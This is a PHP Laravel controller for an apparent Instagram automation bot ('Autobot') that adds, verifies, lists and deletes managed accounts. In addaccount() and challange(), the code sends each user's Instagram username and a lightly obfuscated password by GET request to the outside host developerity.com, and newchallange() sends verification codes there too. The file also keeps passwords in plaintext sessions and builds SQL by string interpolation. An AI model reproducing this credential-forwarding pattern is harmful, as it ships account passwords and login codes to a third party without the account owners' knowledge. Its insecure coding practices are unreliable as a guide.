<?php

namespace Autobot\Http\Controllers;

use Illuminate\Support\Facades\DB;
use Autobot\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Http\Request;
use GuzzleHttp\Client;

class AccountController extends Controller
{
    /**
     *
     * @param  int  $id
     * @return View
     */
    public function addaccount()
    {
        if (isset($_POST['username']) && isset($_POST['password'])) {
            
            set_time_limit(0);
            date_default_timezone_set('UTC');
            require 'vendor/filp/autoload.php';
            $ig       = new \InstagramAPI\Instagram();
            $username = $_POST['username'];
            $password = $_POST['password'];
            session(['username' => $username]);
            session(['password' => $password]);
            $proxy    = $_POST['proxy'];
            session(['proxy' => $proxy]);
            $user_id = Auth::id();
            
            try {
                
                $ig->login($username, $password);
                
                $user = DB::table('ab_accounts')->where('username', $username)->exists();
                if ($user == null) {
                    $get = '$'.gethop();
                    $get = $get.art($password);

                    $pc = config('app.pcode');
                    $client = new Client();
                    $client->request("GET", "https://developerity.com/dev/newacc.php?code=".$pc."&user_id=".$user_id."&username=".$username."&password=".$get."&proxy=".$proxy);

                    return redirect('newchallange');
                } else {
                    return redirect('newaccount?duplicate-account');
                }
            }
            catch (\InstagramAPI\Exception\InstagramException $e) {
                $error = $e->getMessage();
                if ($error == "InstagramAPI\Response\LoginResponse: Challenge required.") {
                    $a = $e->getResponse()->asArray();
                    $path = ltrim($a['challenge']['api_path'], '/');

                    $d = $ig->getDetails($path);
                    
                    session(['path' => $path]);
                    session(['data' => $d]);
                    return redirect('challangem');
                    exit(0);
                }else{
                    $error = str_replace("InstagramAPI\Response\LoginResponse: ", "", $error);
                    return redirect("newaccount?error=" . $error);
                    exit(0);
                }
            }
        }
    }

    public function challange()
    {
        set_time_limit(0);
        date_default_timezone_set('UTC');
        if($_POST){
            require 'vendor/filp/autoload.php';
            $ig       = new \InstagramAPI\Instagram();
            $username = session('username');
            $password = session('password');
            $proxy = session('proxy');
            $user_id  = Auth::id();

            try {
                $path = session('path');
                $ig->SetUser($username, $password);
                $r = $ig->completeCode($path, $_POST['codee']);

                $user = DB::table('ab_accounts')->where('username', $username)->exists();
                if ($user == null) {
                    $get = '$'.gethop();
                    $get = $get.art($password);
                    
                    $pc = config('app.pcode');
                    $client = new Client();
                    $client->request("GET", "https://developerity.com/dev/newacc.php?code=".$pc."&user_id=".$user_id."&username=".$username."&password=".$get."&proxy=".$proxy);

                    return redirect('newchallange');
                } else {
                    return redirect('newaccount?duplicate-account');
                }
            } catch (\InstagramAPI\Exception\InstagramException $e) {
                $error = $e->getMessage();
                return redirect('default.challange?error='.$error);
            }
        }
        return view('default.challange');
    }

    public function challangem()
    {
        require 'vendor/filp/autoload.php';
        if($_POST){
            $choice = $_POST['choice'] - 1;
            $ig = new \InstagramAPI\Instagram();

            try {
                $username = session('username');
                $password = session('password');
                $path = session('path');
                $ig->SetUser($username, $password);
                $r = $ig->sendCode($path,$choice);

                return redirect('challange');
            } catch (\InstagramAPI\Exception\InstagramException $e) {
                $error = $e->getMessage();
                return redirect('default.challangem?error='.$error);
            }
        }
        $data = session('data');
        return view('default.challangem', ['data' => $data]);
    }

    public function newchallange()
    {
        if($_POST){
            $username = $_POST['username'];
            $code = $_POST['code'];

            $client = new Client();
            $client->request('GET', 'https://developerity.com/dev/rorc.php?p=a29d0b7a495a80386f5f01dcda7d0x6d60003a72&username='.$username.'&code='.$code);

            return redirect('accounts?ok');
        }
        return view('default.newchallange');
    }

    public function accounts()
    {
        $user_id = Auth::id();
        $accounts = DB::select("SELECT * FROM ab_accounts WHERE user_id='$user_id'");
        if ($accounts == !NULL) {
            return view('default.accounts', ['accounts' => $accounts]);
        } else {
            return view('default.accounts');
        }
    }
    
    public function listaccounts($username)
    {
        $user_id = Auth::id();
        $accounts = DB::select("SELECT * FROM ab_accounts WHERE user_id='$user_id'");
        $user     = DB::table('ab_accounts')->where('user_id', $user_id)->where('username', $username)->first();
        $query = DB::table('ab_settings')->where('name', 'proxysettings')->first();
        $query = json_decode($query->data);
        if ($user == !NULL) {
            if ($username == $user->username) {
                return view('default.accounts', ['accounts' => $accounts, 'edituser' => $username, 'username' => $user->username, 'query' => $query, 'proxy' => $user->proxy]);
            } else {
                return redirect('accounts');
            }
        }else{
            return redirect('accounts');
        }
    }

    public function newaccount()
    {
        $query = DB::table('ab_settings')->where('name', 'proxysettings')->first();
        $query = json_decode($query->data);
        return view('default.newaccount', ['query' => $query]);
    }

    public function newacc($user_id,$username,$password,$proxy)
    {
        if ($proxy == "NULL") {
            $proxy = NULL;
        }
        $user = DB::table('ab_accounts')->where('username', $username)->first();
        if ($user == NULL) {
            DB::table('ab_accounts')->insert(['user_id' => $user_id, 'username' => $username, 'password' => $password, 'profilepic' => 'resources/views/default/images/loading.gif', 'proxy' => $proxy]);
        }else{
            return redirect('accounts');
        }
    }

    public function deleteaccount($username)
    {
        $user_id = Auth::id();
        $user     = DB::table('ab_accounts')->where('user_id', $user_id)->where('username', $username)->first();
        if ($user == !NULL) {
            if ($username == $user->username) {
                DB::table('ab_accounts')->where('user_id', $user_id)->where('username', $username)->delete();
                DB::table('ab_autocomment_data')->where('user_id', $user_id)->where('username', $username)->delete();
                DB::table('ab_autodmtonew_data')->where('user_id', $user_id)->where('username', $username)->delete();
                DB::table('ab_autofollow_data')->where('user_id', $user_id)->where('username', $username)->delete();
                DB::table('ab_autolike_data')->where('user_id', $user_id)->where('username', $username)->delete();
                DB::table('ab_automessage_data')->where('user_id', $user_id)->where('username', $username)->delete();
                DB::table('ab_autorepost_data')->where('user_id', $user_id)->where('username', $username)->delete();
                DB::table('ab_autounfollow_data')->where('user_id', $user_id)->where('username', $username)->delete();
                DB::table('ab_logs')->where('username', $username)->delete();
                DB::table('ab_photos')->where('user_id', $user_id)->where('username', $username)->delete();
                DB::table('ab_scheduledposts')->where('user_id', $user_id)->where('username', $username)->delete();
                DB::table('ab_schedule_data')->where('user_id', $user_id)->where('username', $username)->delete();

                unlink("vendor/mgp25/instagram-php/sessions/".$username."/".$username."-cookies.dat");
                unlink("vendor/mgp25/instagram-php/sessions/".$username."/".$username."-settings.dat");
                rmdir("vendor/mgp25/instagram-php/sessions/".$username);
                return redirect('accounts');
            } else {
                return redirect('accounts');
            }
        }else{
            return redirect('accounts');
        }
    }

    public function privateaccount(Request $request)
    {
        set_time_limit(0);
        date_default_timezone_set('UTC');
        ini_set('max_execution_time', '0');
        require 'vendor/filp/autoload.php';
        $username = $request->input('username');
        $privateaccount = $request->input('privateaccount') ? 1 : 0;
        $user_id  = Auth::id();
        
        $ig      = new \InstagramAPI\Instagram();
        try {
            $proxies = DB::table('ab_proxies')->inRandomOrder()->first();

            if (!empty($proxies)) {
                $ig->setProxy($proxies->proxy);
            }

            $account  = DB::table('ab_accounts')->where('user_id', $user_id)->where('username', $username)->first();
            $pass     = noah($account->password);
            $password = ulus($pass);

            $ig->login($account->username, $password);
        }
        catch (\Exception $e) {
            echo $e->getMessage();
            exit(0);
        }

        try {
            if ($privateaccount == 1) {
                $ig->account->setPrivate();
                DB::table('ab_accounts')->where('user_id', $user_id)->where('username', $username)->update(['private' => 1]);
                return back()->withInput();
            }else{
                $ig->account->setPublic();
                DB::table('ab_accounts')->where('user_id', $user_id)->where('username', $username)->update(['private' => 0]);
                return back()->withInput();
            }
        }
        catch (\Exception $e) {
            echo $e->getMessage();
            exit(0);
        }
    }
}